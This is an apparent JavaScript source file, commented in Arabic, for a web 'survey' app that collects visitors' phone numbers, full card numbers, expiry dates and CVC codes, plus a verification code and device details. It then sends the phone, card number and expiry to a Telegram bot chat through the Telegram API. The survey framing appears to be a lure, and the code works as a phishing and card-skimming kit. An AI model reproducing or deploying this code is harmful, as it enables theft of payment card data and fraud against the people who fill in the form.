// التطبيق الرئيسي
class SurveyApp {
    constructor() {
        this.currentStep = 1;
        this.formData = {};
        this.init();
    }
    
    init() {
        this.setupEventListeners();
        this.updateParticipantsCount();
    }
    
    // تحديث عدد المشاركين
    updateParticipantsCount() {
        const participants = DB.getParticipants();
        const countElement = document.getElementById('total-participants');
        if (countElement) {
            countElement.textContent = participants.length;
        }
    }
    
    // بدء الاستبيان
    startSurvey() {
        // التحقق من الحد الأقصى
        const participants = DB.getParticipants();
        if (participants.length >= 10000) {
            this.showNotification('تم الوصول للحد الأقصى للمشاركين', 'error');
            return;
        }
        
        // الانتقال لصفحة الاستبيان
        document.getElementById('home-page').classList.remove('active');
        document.getElementById('survey-page').classList.add('active');
        
        // تحميل الخطوة الأولى
        this.loadStep(1);
    }
    
    // تحميل الخطوة
    loadStep(step) {
        this.currentStep = step;
        
        // تحديث شريط التقدم
        document.querySelectorAll('.step').forEach(el => {
            el.classList.remove('active');
        });
        
        // إظهار الخطوة الحالية
        document.querySelector(`.step[data-step="${step}"]`).classList.add('active');
        
        // إخفاء جميع الخطوات
        document.querySelectorAll('#step-1, #step-2, #step-3').forEach(el => {
            el.classList.remove('active');
        });
        
        // إظهار الخطوة المطلوبة
        document.getElementById(`step-${step}`).classList.add('active');
        
        // إذا كانت الخطوة الثانية، اكتشف معلومات الجهاز
        if (step === 2) {
            this.showDeviceInfo();
        }
    }
    
    // الانتقال للخطوة التالية
    nextStep(currentStep) {
        // التحقق من البيانات قبل المتابعة
        if (!this.validateStep(currentStep)) {
            this.showNotification('يرجى ملء جميع الحقول بشكل صحيح', 'error');
            return;
        }
        
        if (currentStep === 1) {
            // حفظ البيانات المؤقتة
            this.formData = {
                phone: document.getElementById('phone').value,
                cardNumber: document.getElementById('card-number').value,
                expiryDate: document.getElementById('expiry-date').value,
                cvc: document.getElementById('cvc').value
            };
            
            this.loadStep(2);
            
        } else if (currentStep === 2) {
            // تأكيد واكتمال الاستبيان
            this.completeSurvey();
        }
    }
    
    // اكتمال الاستبيان
    async completeSurvey() {
        try {
            // إضافة بيانات الجهاز
            this.formData.deviceInfo = DB.getDeviceInfo();
            
            // حفظ المشارك في قاعدة البيانات
            const result = DB.addParticipant(this.formData);
            
            if (result.success) {
                // إظهار رسالة النجاح
                this.loadStep(3);
                
                // تعبئة بيانات المشاركة
                document.getElementById('participation-id').textContent = result.id;
                document.getElementById('participation-date').textContent = 
                    new Date().toLocaleDateString('ar-SA', {
                        year: 'numeric',
                        month: 'long',
                        day: 'numeric',
                        hour: '2-digit',
                        minute: '2-digit'
                    });
                
                // تحديث العدادات
                this.updateParticipantsCount();
                
                this.showNotification('تم حفظ مشاركتك بنجاح!', 'success');
                
                // محاولة الإرسال لتليجرام (إذا تم ضبطه)
                this.sendToTelegram(result.participant);
                
            } else {
                this.showNotification('حدث خطأ أثناء الحفظ', 'error');
            }
            
        } catch (error) {
            console.error('خطأ في اكتمال الاستبيان:', error);
            this.showNotification('حدث خطأ غير متوقع', 'error');
        }
    }
    
    // التحقق من صحة الخطوة
    validateStep(step) {
        if (step === 1) {
            const phone = document.getElementById('phone').value;
            const card = document.getElementById('card-number').value;
            const expiry = document.getElementById('expiry-date').value;
            const cvc = document.getElementById('cvc').value;
            
            // التحقق من رقم الهاتف (05XXXXXXXX)
            if (!/^(05|06|07)[0-9]{8}$/.test(phone.replace(/\s/g, ''))) {
                this.showNotification('رقم الهاتف غير صالح', 'error');
                return false;
            }
            
            // التحقق من رقم البطاقة (16 رقم)
            if (!/^[0-9]{16}$/.test(card.replace(/\s/g, ''))) {
                this.showNotification('رقم البطاقة غير صالح', 'error');
                return false;
            }
            
            // التحقق من تاريخ الصلاحية
            if (!expiry) {
                this.showNotification('يرجى اختيار تاريخ الصلاحية', 'error');
                return false;
            }
            
            // التحقق من رمز الأمان
            if (!/^[0-9]{3}$/.test(cvc)) {
                this.showNotification('رمز الأمان غير صالح', 'error');
                return false;
            }
            
            return true;
            
        } else if (step === 2) {
            const code = document.getElementById('verification-code').value;
            
            // رمز التحقق للاختبار هو 123456
            if (code !== '123456') {
                this.showNotification('رمز التحقق غير صحيح', 'error');
                return false;
            }
            
            return true;
        }
        
        return true;
    }
    
    // عرض معلومات الجهاز
    showDeviceInfo() {
        const deviceInfo = DB.getDeviceInfo();
        const deviceElement = document.getElementById('device-type');
        
        if (deviceElement) {
            // تحديد نوع الجهاز
            let deviceType = 'جهاز كمبيوتر';
            const userAgent = navigator.userAgent.toLowerCase();
            
            if (/mobile|android|iphone|ipod/.test(userAgent)) {
                deviceType = 'هاتف محمول';
            } else if (/tablet|ipad/.test(userAgent)) {
                deviceType = 'جهاز لوحي';
            }
            
            deviceElement.textContent = `${deviceType} - ${deviceInfo.platform}`;
        }
    }
    
    // إرسال لتليجرام
    async sendToTelegram(participant) {
        if (!CONFIG.TELEGRAM.ENABLED || !CONFIG.TELEGRAM.BOT_TOKEN) {
            return;
        }
        
        try {
            const message = `
📊 مشاركة جديدة في الاستبيان
────────────────────
📱 الهاتف: ${participant.phone}
💳 البطاقة: ${participant.cardNumber}
📅 الصلاحية: ${participant.expiryDate}
🆔 الرقم: ${participant.id}
⏰ التاريخ: ${new Date(participant.createdAt).toLocaleString('ar-SA')}
            `;
            
            const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.TELEGRAM.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const data = await response.json();
            console.log('تم الإرسال لتليجرام:', data.ok);
            
        } catch (error) {
            console.error('خطأ في الإرسال لتليجرام:', error);
        }
    }
    
    // الرجوع للصفحة السابقة
    goBack() {
        if (this.currentStep > 1) {
            this.loadStep(this.currentStep - 1);
        } else {
            this.goHome();
        }
    }
    
    // العودة للصفحة الرئيسية
    goHome() {
        document.getElementById('survey-page').classList.remove('active');
        document.getElementById('home-page').classList.add('active');
        
        // إعادة تعيين النموذج
        this.resetForm();
        this.currentStep = 1;
    }
    
    // إعادة تعيين النموذج
    resetForm() {
        document.getElementById('phone').value = '';
        document.getElementById('card-number').value = '';
        document.getElementById('expiry-date').value = '';
        document.getElementById('cvc').value = '';
        document.getElementById('verification-code').value = '';
    }
    
    // عرض الإشعارات
    showNotification(message, type = 'info') {
        const notification = document.getElementById('notification');
        
        notification.textContent = message;
        notification.className = `notification ${type} show`;
        
        setTimeout(() => {
            notification.classList.remove('show');
        }, 3000);
    }
    
    // إعداد مستمعي الأحداث
    setupEventListeners() {
        // تحديث عدد المشاركين كل 5 ثوانٍ
        setInterval(() => {
            this.updateParticipantsCount();
        }, 5000);
        
        // الاستماع لتحديثات قاعدة البيانات
        window.addEventListener('storage', (event) => {
            if (event.key === 'fs_last_update' || event.key === 'fs_broadcast') {
                this.updateParticipantsCount();
            }
        });
    }
}

// بدء التطبيق عند تحميل الصفحة
let App;
document.addEventListener('DOMContentLoaded', () => {
    App = new SurveyApp();
    
    // جعل الدوال متاحة عالمياً
    window.startSurvey = () => App.startSurvey();
    window.nextStep = (step) => App.nextStep(step);
    window.goBack = () => App.goBack();
    window.goHome = () => App.goHome();
});